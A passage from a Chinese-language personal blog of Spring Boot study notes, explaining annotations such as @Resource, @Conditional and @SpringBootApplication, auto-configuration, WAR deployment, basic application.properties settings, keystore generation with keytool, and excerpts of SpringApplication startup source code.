less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-variable">@Resource</span>和<span class="hljs-variable">@Autowired</span>注解都是用来实现依赖注入的。只是<span class="hljs-variable">@AutoWried</span>按by type自动注入，而<span class="hljs-variable">@Resource</span>默认按byName自动注入。<br><br><span class="hljs-variable">@Resource</span>有两个重要属性，分别是name和type<br><br>spring将name属性解析为bean的名字，而type属性则被解析为bean的类型。所以如果使用name属性，则使用byName的自动注入策略，如果使用type属性则使用byType的自动注入策略。如果都没有指定，则通过反射机制使用byName自动注入策略。<br></code></pre></td></tr></table></figure><h4 id="Target-ElementType-TYPE-说明该注解只能用在接口或者类和enum上"><a href="#Target-ElementType-TYPE-说明该注解只能用在接口或者类和enum上" class="headerlink" title="@Target({ElementType.TYPE})说明该注解只能用在接口或者类和enum上"></a>@Target({ElementType.TYPE})说明该注解只能用在接口或者类和enum上</h4><h4 id="Retention-RetentionPolicy-RUNTIME-说明是运行注解"><a href="#Retention-RetentionPolicy-RUNTIME-说明是运行注解" class="headerlink" title="@Retention(RetentionPolicy.RUNTIME)说明是运行注解"></a>@Retention(RetentionPolicy.RUNTIME)说明是运行注解</h4><h4 id="Documented将注解添加到doc中"><a href="#Documented将注解添加到doc中" class="headerlink" title="@Documented将注解添加到doc中"></a>@Documented将注解添加到doc中</h4><h4 id="Inherited-可以被继承"><a href="#Inherited-可以被继承" class="headerlink" title="@Inherited:可以被继承"></a>@Inherited:可以被继承</h4><h4 id="SpringBootConfiguration-springboot的配置注解"><a href="#SpringBootConfiguration-springboot的配置注解" class="headerlink" title="@SpringBootConfiguration:springboot的配置注解"></a>@SpringBootConfiguration:springboot的配置注解</h4><h4 id="EnableAutoConfiguration-启用自动注解功能"><a href="#EnableAutoConfiguration-启用自动注解功能" class="headerlink" title="@EnableAutoConfiguration:启用自动注解功能"></a>@EnableAutoConfiguration:启用自动注解功能</h4><h4 id="ComponentScan-组件的自动扫描"><a href="#ComponentScan-组件的自动扫描" class="headerlink" title="@ComponentScan:组件的自动扫描"></a>@ComponentScan:组件的自动扫描</h4><h4 id="AutoConfigureOrder"><a href="#AutoConfigureOrder" class="headerlink" title="@AutoConfigureOrder"></a>@AutoConfigureOrder</h4><p>​代表启动的加载顺序参数越小越早加载</p><p>​@AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE)</p><h4 id="AutoConfigureAfter"><a href="#AutoConfigureAfter" class="headerlink" title="@AutoConfigureAfter"></a>@AutoConfigureAfter</h4><p>在…之后加载例如</p><p>@AutoConfigureAfter(ServletWebServerFactoryAutoConfiguration.class)这样就表示当使用了该注释要在ServletWebServerFactoryAutoConfiguration.class之后加载该类</p><h4 id="EnableConfigurationProperties"><a href="#EnableConfigurationProperties" class="headerlink" title="@EnableConfigurationProperties"></a>@EnableConfigurationProperties</h4><p><a href="https://www.jianshu.com/p/7f54da1cb2eb">https://www.jianshu.com/p/7f54da1cb2eb</a></p><p> @EnableConfigurationProperties 相当于把使用 @ConfigurationProperties 的类进行了一次注入</p><p>当<code>@EnableConfigurationProperties</code>注解应用到你的<code>@Configuration</code>时， 任何被<code>@ConfigurationProperties</code>注解的beans将自动被Environment属性配置</p><p>说白了根据配置文件来初始化这个类</p><p>例如@EnableConfigurationProperties(WebMvcProperties.class)</p><p>而WebMvcProperties源码为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;spring.mvc&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebMvcProperties</span> &#123;<br></code></pre></td></tr></table></figure><p>该类会根据配置文件的spring.mvc来进行装配</p><h3 id="Conditional"><a href="#Conditional" class="headerlink" title="@Conditional"></a>@Conditional</h3><h4 id="ConditionalOnWebApplication-type-x3D-Type-SERVLET"><a href="#ConditionalOnWebApplication-type-x3D-Type-SERVLET" class="headerlink" title="@ConditionalOnWebApplication(type &#x3D; Type.SERVLET)"></a>@ConditionalOnWebApplication(type &#x3D; Type.SERVLET)</h4><p>通过源码可以查看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(&#123; ElementType.TYPE, ElementType.METHOD &#125;)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Conditional(OnWebApplicationCondition.class)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> ConditionalOnWebApplication &#123;<br>    <br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * The required type of the web application.</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> the required web application type</span><br><span class="hljs-comment"> */</span><br>Type <span class="hljs-title function_">type</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> Type.ANY;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Available application types.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">enum</span> <span class="hljs-title class_">Type</span> &#123;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Any web application will match.</span><br><span class="hljs-comment"> */</span><br>ANY,<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Only servlet-based web application will match.</span><br><span class="hljs-comment"> */</span><br>SERVLET,<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Only reactive-based web application will match.</span><br><span class="hljs-comment"> */</span><br>REACTIVE<br><br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>实际上就是一个Conditional就是当OnWebApplicationCondition加载时才会生效</p><p>@Conditional:只有满足一些列条件之后创建一个bean。</p><p>而内部是一个枚举遍历代表有着三种环境默认是ANY,而匹配web application才会是SERVLET</p><h4 id="ConditionalOnClass"><a href="#ConditionalOnClass" class="headerlink" title="@ConditionalOnClass"></a>@ConditionalOnClass</h4><p>判断当前classpath是否存在指定类，若存在则实例化被注释的类</p><p>例如@ConditionalOnClass(DispatcherServlet.class)</p><h4 id="ConditionalOnMissingBean"><a href="#ConditionalOnMissingBean" class="headerlink" title="@ConditionalOnMissingBean"></a>@ConditionalOnMissingBean</h4><p>检测bean是否注册如果注册就不会注册重复的bean，如果不存在检测的bean则该注解进行注解的类有效</p><h1 id="extend-SpringBootServletInitializer"><a href="#extend-SpringBootServletInitializer" class="headerlink" title="extend SpringBootServletInitializer"></a>extend SpringBootServletInitializer</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> SpringApplicationBuilder <span class="hljs-title function_">configure</span><span class="hljs-params">(SpringApplicationBuilder application)</span> &#123;<br>        <span class="hljs-keyword">return</span> application.sources(XXXApplication】.class);<br>    &#125;<br></code></pre></td></tr></table></figure><p>springboot项目，若打包成war包，使用外置的tomcat启动</p><p>1、需要继承 org.springframework.boot.context.web.SpringBootServletInitializer类</p><p>2、然后重写configure(SpringApplicationBuilder application)方法<br>因为我们的项目是打成war包，然后部署到tomcat的~(还延续了mvc的方式)</p><h1 id="整理文章"><a href="#整理文章" class="headerlink" title="整理文章"></a>整理文章</h1><h3 id="springboot-启动类Application-扫盲（继承SpringBootServletInitializer作用）"><a href="#springboot-启动类Application-扫盲（继承SpringBootServletInitializer作用）" class="headerlink" title="springboot 启动类Application 扫盲（继承SpringBootServletInitializer作用）"></a>springboot 启动类Application 扫盲（继承SpringBootServletInitializer作用）</h3><p><a href="https://blog.csdn.net/pmdream/article/details/96434028">https://blog.csdn.net/pmdream/article/details/96434028</a></p><h3 id="Spring-Boot快速入门"><a href="#Spring-Boot快速入门" class="headerlink" title="Spring Boot快速入门"></a>Spring Boot快速入门</h3><p><a href="https://blog.didispace.com/spring-boot-learning-1/">https://blog.didispace.com/spring-boot-learning-1/</a></p><h3 id="springboot配置文件"><a href="#springboot配置文件" class="headerlink" title="springboot配置文件"></a>springboot配置文件</h3><p><a href="https://blog.didispace.com/springbootproperties/">https://blog.didispace.com/springbootproperties/</a></p><p>在命令行运行时，连续的两个减号<code>--</code>就是对<code>application.properties</code>中的属性值进行赋值的标识。所以，<code>java -jar xxx.jar --server.port=8888</code>命令，等价于我们在<code>application.properties</code>中添加属性<code>server.port=8888</code>，该设置在样例工程中可见，读者可通过删除该值或使用命令行来设置该值来验证。</p><h3 id="springboot对MVC自动装配"><a href="#springboot对MVC自动装配" class="headerlink" title="springboot对MVC自动装配"></a>springboot对MVC自动装配</h3><p><a href="https://docs.spring.io/spring-boot/docs/2.5.4/reference/htmlsingle/#features.spring-application">https://docs.spring.io/spring-boot/docs/2.5.4/reference/htmlsingle/#features.spring-application</a></p><p>①自动配置了视图解析器<br>②静态资源文件处理<br>③自动注册了大量的转换器和格式化器<br>④提供HttpMessageConverter对请求参数和返回结果进行处理<br>⑤自动注册了MessageCodesResolver<br>⑥默认欢迎页配置<br>⑦可配置的Web初始化绑定器</p><p>对于自动装配类WebMvcAutoConfiguration</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@ConditionalOnWebApplication(type = Type.SERVLET)</span><br><span class="hljs-meta">@ConditionalOnClass(&#123; Servlet.class, DispatcherServlet.class, WebMvcConfigurer.class &#125;)</span><br><span class="hljs-meta">@ConditionalOnMissingBean(WebMvcConfigurationSupport.class)</span><br><span class="hljs-meta">@AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE + 10)</span><br><span class="hljs-meta">@AutoConfigureAfter(&#123; DispatcherServletAutoConfiguration.class, TaskExecutionAutoConfiguration.class,</span><br><span class="hljs-meta">ValidationAutoConfiguration.class &#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebMvcAutoConfiguration</span> &#123;<br></code></pre></td></tr></table></figure><p>该类是被注册为一个配置文件,并且在SERVLET环境满足Servlet、DispatcherServlet、WebMvcConfigurer类被装配且不存在WebMvcConfigurationSupport类的情况下下才会生效而且要在DispatcherServletAutoConfiguration，TaskExecutionAutoConfiguration，ValidationAutoConfiguration类之后加载,</p><h3 id="视图解析器"><a href="#视图解析器" class="headerlink" title="视图解析器"></a>视图解析器</h3><p>用来将逻辑视图转换为物理视图并且所有视图解析器都要继承ViewResolver接口，SpringMVC的上下文配置可以指定他们的顺序，每种策略对应着一个实体类，这样开发者可以混用多个视图解析器并指定先后顺序，直到视图解析并返回视图。</p><h3 id="web应用1"><a href="#web应用1" class="headerlink" title="web应用1"></a>web应用1</h3><p><a href="https://blog.didispace.com/springbootweb/">https://blog.didispace.com/springbootweb/</a></p><h2 id="DispatcherServlet"><a href="#DispatcherServlet" class="headerlink" title="DispatcherServlet"></a>DispatcherServlet</h2><p>这是SpringMVC中可见DispatcherServlet的重要性而SpringBoot是将Spring进行自动装配的升阶版</p><h1 id="Springboot-vue全栈"><a href="#Springboot-vue全栈" class="headerlink" title="Springboot+vue全栈"></a>Springboot+vue全栈</h1><h3 id="启动类的介绍"><a href="#启动类的介绍" class="headerlink" title="启动类的介绍"></a>启动类的介绍</h3><p>@SpringBootApplication是一个@Configuration所以是一个配置类可以在该类中@EnableAutoConfiguration标识开启自动化配置@ComponentScan扫描包并把默认扫描的类都位于当前类所在包的下面</p><p>虽然启动类上面包含@Configuration注解但是开发者可以创建一个新的类来配置bean</p><p>@ComponentScan除了扫描@Service、@Repository、@Component、@Controller和@RestController还会扫描@Configuration</p><blockquote><p>我们可以在resources下面创建banner.txt来打印启动时的TXT艺术字</p></blockquote><p>如果想要关闭在main中写入下面代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">SpringApplicationBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SpringApplicationBuilder</span>(JavaProjectApplication.class);<br>builder.bannerMode(Banner.Mode.OFF).run(args);<br></code></pre></td></tr></table></figure><h3 id="基本的配置文件"><a href="#基本的配置文件" class="headerlink" title="基本的配置文件"></a>基本的配置文件</h3><p>application.properties</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment">#端口</span><br><span class="hljs-attr">server.port</span>=<span class="hljs-string">8081</span><br><span class="hljs-comment">#错误后映射的地址</span><br><span class="hljs-attr">server.error.path</span>=<span class="hljs-string">ierror</span><br><span class="hljs-comment">#session的超时m代表分支默认秒</span><br><span class="hljs-attr">server.servlet.session</span> <span class="hljs-string">.timeout=30m</span><br><span class="hljs-comment">#项目路径默认/</span><br><span class="hljs-attr">server.servlet.context-path</span>= <span class="hljs-string">/chapter02</span><br><span class="hljs-comment">#字节编码</span><br><span class="hljs-attr">server.tomcat.uri-encoding</span>=<span class="hljs-string">utf-8</span><br><span class="hljs-comment">#允许的最大连接数</span><br><span class="hljs-attr">server.tomcat.max-threads</span>=<span class="hljs-string">500</span><br><span class="hljs-comment">#日志存放位置</span><br><span class="hljs-attr">server.tomcat.basedir</span>=<span class="hljs-string">/home/ sang/ tmp</span><br></code></pre></td></tr></table></figure><h3 id="生成ssh认证"><a href="#生成ssh认证" class="headerlink" title="生成ssh认证"></a>生成ssh认证</h3><p>keytool -genkey -alias tomcathttps -keyalg RSA -keysize 2048 -keystore sang.p12 -validity 365</p><ul><li>-genkey创建一个新的密钥</li><li>-alias表示keystore的别名</li><li>-keyalg表示使用加密算法式RSA</li><li>-keysize表示密钥长度</li><li>-keystore表示生成的密钥存放位置</li><li>-validity表示密钥的有效时间单位为天</li></ul><p>输入相关信息后会在当前目录生成一个sang.p12的文件</p><p>key-store表示文件名</p><p>key-alias表示密钥别名</p><p>key-store-password刚刚输入的密码</p><p>运行并输入<a href="https://localhost:8080进行查看（注意使用http会告诉请求失败，需要重定向）">https://localhost:8080进行查看（注意使用http会告诉请求失败，需要重定向）</a></p><h1 id="完结-tmd这本书为啥这么老-连个代码都没法弄"><a href="#完结-tmd这本书为啥这么老-连个代码都没法弄" class="headerlink" title="完结!!!!tmd这本书为啥这么老!连个代码都没法弄"></a>完结!!!!tmd这本书为啥这么老!连个代码都没法弄</h1><h2 id="另一本书"><a href="#另一本书" class="headerlink" title="另一本书"></a>另一本书</h2><h3 id="SpringBootApplication"><a href="#SpringBootApplication" class="headerlink" title="@SpringBootApplication"></a>@SpringBootApplication</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Target(&#123;ElementType.TYPE&#125;)</span><br><span class="hljs-meta">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="hljs-meta">@Documented</span><br><span class="hljs-meta">@Inherited</span><br><span class="hljs-meta">@SpringBootConfiguration</span><br><span class="hljs-meta">@EnableAutoConfiguration</span><br><span class="hljs-meta">@ComponentScan(</span><br><span class="hljs-meta">    excludeFilters = &#123;@Filter(</span><br><span class="hljs-meta">    type = FilterType.CUSTOM,</span><br><span class="hljs-meta">    classes = &#123;TypeExcludeFilter.class&#125;</span><br><span class="hljs-meta">), @Filter(</span><br><span class="hljs-meta">    type = FilterType.CUSTOM,</span><br><span class="hljs-meta">    classes = &#123;AutoConfigurationExcludeFilter.class&#125;</span><br><span class="hljs-meta">)&#125;</span><br><span class="hljs-meta">)</span><br><span class="hljs-keyword">public</span> <span class="hljs-meta">@interface</span> SpringBootApplication &#123;<br>    <span class="hljs-meta">@AliasFor(</span><br><span class="hljs-meta">        annotation = EnableAutoConfiguration.class</span><br><span class="hljs-meta">    )</span><br>    Class&lt;?&gt;[] exclude() <span class="hljs-keyword">default</span> &#123;&#125;;<br><br>    <span class="hljs-meta">@AliasFor(</span><br><span class="hljs-meta">        annotation = EnableAutoConfiguration.class</span><br><span class="hljs-meta">    )</span><br>    String[] excludeName() <span class="hljs-keyword">default</span> &#123;&#125;;<br><br>    <span class="hljs-meta">@AliasFor(</span><br><span class="hljs-meta">        annotation = ComponentScan.class,</span><br><span class="hljs-meta">        attribute = &quot;basePackages&quot;</span><br><span class="hljs-meta">    )</span><br>    String[] scanBasePackages() <span class="hljs-keyword">default</span> &#123;&#125;;<br><br>    <span class="hljs-meta">@AliasFor(</span><br><span class="hljs-meta">        annotation = ComponentScan.class,</span><br><span class="hljs-meta">        attribute = &quot;basePackageClasses&quot;</span><br><span class="hljs-meta">    )</span><br>    Class&lt;?&gt;[] scanBasePackageClasses() <span class="hljs-keyword">default</span> &#123;&#125;;<br><br>    <span class="hljs-meta">@AliasFor(</span><br><span class="hljs-meta">        annotation = ComponentScan.class,</span><br><span class="hljs-meta">        attribute = &quot;nameGenerator&quot;</span><br><span class="hljs-meta">    )</span><br>    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BeanNameGenerator</span>&gt; nameGenerator() <span class="hljs-keyword">default</span> BeanNameGenerator.class;<br><br>    <span class="hljs-meta">@AliasFor(</span><br><span class="hljs-meta">        annotation = Configuration.class</span><br><span class="hljs-meta">    )</span><br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">proxyBeanMethods</span><span class="hljs-params">()</span> <span class="hljs-keyword">default</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>源码</p><p>首先是@Target({ElementType.TYPE})说明该注解只能用在接口或者类和enum上</p><p>@Retention(RetentionPolicy.RUNTIME)说明是运行注解</p><p>@Documented将注解添加到doc中</p><p>@Inherited:可以被继承</p><p>@SpringBootConfiguration:springboot的配置注解实际上就是一个@Configuration</p><p>@EnableAutoConfiguration:启用自动注解功能</p><p>@ComponentScan:组件的自动扫描</p><p>SpringApplication的启动流程</p><p>通过run()方法我们得到</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ConfigurableApplicationContext <span class="hljs-title function_">run</span><span class="hljs-params">(Class&lt;?&gt; primarySource, String... args)</span> &#123;<br>        <span class="hljs-keyword">return</span> run(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;primarySource&#125;, args);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> ConfigurableApplicationContext <span class="hljs-title function_">run</span><span class="hljs-params">(Class&lt;?&gt;[] primarySources, String[] args)</span> &#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SpringApplication</span>(primarySources)).run(args);<br>    &#125;<br><br><span class="hljs-comment">//最终执行的run</span><br>    <span class="hljs-keyword">public</span> ConfigurableApplicationContext <span class="hljs-title function_">run</span><span class="hljs-params">(String... args)</span> &#123;<br>        <span class="hljs-type">StopWatch</span> <span class="hljs-variable">stopWatch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StopWatch</span>();<br>        stopWatch.start();<br>        <span class="hljs-type">DefaultBootstrapContext</span> <span class="hljs-variable">bootstrapContext</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.createBootstrapContext();<br>        <span class="hljs-type">ConfigurableApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-built_in">this</span>.configureHeadlessProperty();<br>        <span class="hljs-type">SpringApplicationRunListeners</span> <span class="hljs-variable">listeners</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getRunListeners(args);<br>        listeners.starting(bootstrapContext, <span class="hljs-built_in">this</span>.mainApplicationClass);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ApplicationArguments</span> <span class="hljs-variable">applicationArguments</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultApplicationArguments</span>(args);<br>            <span class="hljs-type">ConfigurableEnvironment</span> <span class="hljs-variable">environment</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.prepareEnvironment(listeners, bootstrapContext, applicationArguments);<br>            <span class="hljs-built_in">this</span>.configureIgnoreBeanInfo(environment);<br>            <span class="hljs-type">Banner</span> <span class="hljs-variable">printedBanner</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.printBanner(environment);<br>            context = <span class="hljs-built_in">this</span>.createApplicationContext();<br>            context.setApplicationStartup(<span class="hljs-built_in">this</span>.applicationStartup);<br>            <span class="hljs-built_in">this</span>.prepareContext(bootstrapContext, context, environment, listeners, applicationArguments, printedBanner);<br>            <span class="hljs-built_in">this</span>.refreshContext(context);<br>            <span class="hljs-built_in">this</span>.afterRefresh(context, applicationArguments);<br>            stopWatch.stop();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.logStartupInfo) &#123;<br>                (<span class="hljs-keyword">new</span> <span class="hljs-title class_">StartupInfoLogger</span>(<span class="hljs-built_in">this</span>.mainApplicationClass)).logStarted(<span class="hljs-built_in">this</span>.getApplicationLog(), stopWatch);<br>            &#125;<br><br>            listeners.started(context);<br>            <span class="hljs-built_in">this</span>.callRunners(context, applicationArguments);<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable var10) &#123;<br>            <span class="hljs-built_in">this</span>.handleRunFailure(context, var10, listeners);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(var10);<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            listeners.running(context);<br>            <span class="hljs-keyword">return</span> context;<br>        &#125; <span class="hljs-keyword">catch</span> (Throwable var9) &#123;<br>            <span class="hljs-built_in">this</span>.handleRunFailure(context, var9, (SpringApplicationRunListeners)<span class="hljs-literal">null</span>);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(var9);<br>        &#125;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>通过代码得知我们需要查看SpringApplication的构造函数得</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">SpringApplication</span><span class="hljs-params">(ResourceLoader resourceLoader, Class&lt;?&gt;... primarySources)</span> &#123;<br>    <span class="hljs-built_in">this</span>.sources = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashSet</span>();<br>    <span class="hljs-built_in">this</span>.bannerMode = Mode.CONSOLE;<br>    <span class="hljs-built_in">this</span>.logStartupInfo = <span class="hljs-literal">true</span>;<br>    <span class="hljs-built_in">this</span>.addCommandLineProperties = <span class="hljs-literal">true</span>;<br>    <span class="hljs-built_in">this</span>.addConversionService = <span class="hljs-literal">true</span>;<br>    <span class="hljs-built_in">this</span>.headless = <span class="hljs-literal">true</span>;<br>    <span class="hljs-built_in">this</span>.registerShutdownHook = <span class="hljs-literal">true</span>;<br>    <span class="hljs-built_in">this</span>.additionalProfiles = Collections.emptySet();<br>    <span class="hljs-built_in">this</span>.isCustomEnvironment = <span class="hljs-literal">false</span>;<br>    <span class="hljs-built_in">this</span>.lazyInitialization = <span class="hljs-literal">false</span>;<br>    <span class="hljs-built_in">this</span>.applicationContextFactory = ApplicationContextFactory.DEFAULT;<br>    <span class="hljs-built_in">this</span>.applicationStartup = ApplicationStartup.DEFAULT;<br>    <span class="hljs-built_in">this</span>.resourceLoader = resourceLoader;<br>    Assert.notNull(primarySources, <span class="hljs-string">&quot;PrimarySources must not be null&quot;</span>);<br>    <span class="hljs-built_in">this</span>.primarySources = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashSet</span>(Arrays.asList(primarySources));<br>    <span class="hljs-built_in">this</span>.webApplicationType = WebApplicationType.deduceFromClasspath();<br>    <span class="hljs-built_in">this</span>.bootstrapRegistryInitializers = <span class="hljs-built_in">this</span>.getBootstrapRegistryInitializersFromSpringFactories();<br>    <span class="hljs-built_in">this</span>.setInitializers(<span class="hljs-built_in">this</span>.getSpringFactoriesInstances(ApplicationContextInitializer.class));<br>    <span class="hljs-built_in">this</span>.setListeners(<span class="hljs-built_in">this</span>.getSpringFactoriesInstances(ApplicationListener.class));<br>    <span class="hljs-built_in">this</span>.mainApplicationClass = <span class="hljs-built_in">this</span>.deduceMainApplicationClass();<br>&#125;<br></code></pre></td></tr></table></figure><p>其中webApplicationType参数是用于容器环境与容器初始化</p><p>WebApplicationType.deduceFromClasspath()根据这个得到webApplicationType的值为SERVLET</p><p>WebApplicationType的值有3个，分别如下所示。<br>①SERVLET：Servlet环境。<br>②REACTIVE：Reactive环境。<br>③NONE：非Web环境。</p><p>deduceFromClasspath()方法的实现逻辑如下：先判断webflux相关的类是否存在，存在则认为当前应用为REACTIVE类型；不存在则继续判断SERVLET相关的类是否存在，都不存在则为NONE类型；否则，当前应用为SERVLET类型。</p><h1 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 创建线程安全的Map </span><br>   <span class="hljs-keyword">static</span> Map&lt;Long, User&gt; users = Collections.synchronizedMap(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;Long, User&gt;()); <br></code></pre></td></tr></table></figure><h1 id="小后端例子（整合VUE）"><a href="#小后端例子（整合VUE）" class="headerlink" 